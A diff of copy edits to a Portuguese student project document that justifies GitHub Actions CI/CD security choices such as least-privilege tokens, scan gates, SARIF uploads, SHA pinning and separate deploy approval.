@@ -1019,7 +1037,7 @@ sobe SARIF. Um workflow comprometido faz menos estrago se o token só pode ler.
 misturaria dependências de desenvolvimento no gate de produção. Um CVE no `ruff`
 não deveria impedir um deploy da aplicação.
 
-**Versões da matrix numa variable, não no YAML.** Mudar a cobertura de versões é
+**Versões da matrix numa variável, não no YAML.** Mudar a cobertura de versões é
 decisão de configuração, não de código: com `vars.PYTHON_VERSIONS` isso vira uma
 edição em `Settings`, sem commit e sem PR. O fallback no `||` mantém o pipeline
 executável em qualquer clone.
@@ -1031,7 +1049,7 @@ nenhuma tag chegue a virar release sem ter passado por lint, testes e scans.
 resultado três vezes: o `ruff` analisa o código estaticamente, sem executá-lo. O
 job `lint` roda uma vez na versão padrão, em paralelo com os testes.
 
-**Notificação com guard de secret ausente.** O step de envio só roda se o webhook
+**Notificação protegida contra secret ausente.** O step de envio só roda se o webhook
 estiver configurado. Isso mantém o pipeline verde em um fork ou clone do
 repositório, em vez de falhar num `curl` para uma URL vazia.
 
@@ -1041,14 +1059,14 @@ jamais reporta status. Torná-lo obrigatório bloquearia todo merge indefinidame
 **Quem faz o merge não aprova o deploy.** O environment começou sem *Prevent
 self-review*, e o primeiro deploy na `main` acabou aprovado por quem tinha
 disparado o run. Funcionava, mas esvaziava o gate: um passo de aprovação que a
-mesma pessoa cumpre sozinha pega acidente, nunca pega julgamento. Ligamos a
+mesma pessoa cumpre sozinha evita acidentes, mas não garante uma segunda avaliação. Ligamos a
 opção depois de perceber isso, e o histórico de deployments registra os dois
 momentos.
 
 O custo que temíamos não se confirmou. A opção bloqueia **quem disparou o run** —
 e quem dispara é quem clica em *Merge* —, não o autor do pull request. Como o
 `CODEOWNERS` já obriga que o revisor seja outra pessoa, os dois papéis se separam
-sozinhos: o revisor mergeia, o autor aprova o deploy. É a segregação de funções
+sozinhos: o revisor faz o merge, o autor aprova o deploy. É a segregação de funções
 que auditoria de verdade exige, obtida com um checkbox e nenhuma coordenação
 extra.
 
@@ -1068,7 +1086,8 @@ o requisito de fundo, e todos foram medidos antes de decidir.
 O enunciado pede repositório **privado** com o professor como collaborator
 `Read`. Este repositório está **público**.
 
-Três exigências do próprio material só funcionam assim em conta pessoal:
+Três recursos exigidos pelo próprio material só funcionam, numa conta pessoal, com
+o repositório público:
 
 | Recurso | Em repo privado |
 | --- | --- |
@@ -1106,7 +1125,7 @@ sobre a mesma dependência é pior que um gate rigoroso: quem lê o resultado n�
 sabe em qual acreditar, e a tentação é acreditar no que libera o merge.
 
 O custo da rigidez extra é baixo e limitado por `ignore-unfixed: true` — só
-achado com correção publicada pode reprovar, então nunca há build vermelho sem
+achados com correção publicada podem reprovar, então nunca há build vermelho sem
 ação possível. Verificamos que o `requirements.txt` atual passa verde nessa
 faixa, ou seja, a mudança não introduziu ruído.
 
@@ -1116,7 +1135,7 @@ merge**, está atendido com folga: ele bloqueia mais, não menos.
 ### 3. Dois steps que o enunciado não menciona
 
 `if: always()` no upload do SARIF e `category` por versão da matrix. Não são
-preferência: sem o primeiro, o relatório nunca chega à aba Security quando há
+preferência: sem o primeiro, o relatório nunca chega ao code scanning quando há
 vulnerabilidade; sem o segundo, os três uploads do mesmo commit se sobrescrevem e
 podem colidir. Ambos estão comentados no próprio YAML.
 
@@ -1126,7 +1145,7 @@ Os esqueletos usam `checkout@v4.2.2`, `setup-python@v5.6.0` e `cache@v4.2.4`.
 Rodamos as três no release atual, e o `upload-sarif` na CodeQL Action v4.
 
 Também foi medição: com as versões dos esqueletos, **toda execução reportava oito
-avisos** no painel de *Annotations* — Node.js 20 deprecado, actions forçadas para
+avisos** no painel de *Annotations* — Node.js 20 descontinuado, actions forçadas para
 o Node.js 24, e a CodeQL Action v3 saindo em dezembro de 2026. A prática que o
 material ensina, fixar por SHA de commit, continua inteira; o que mudou foi o
 release fixado.
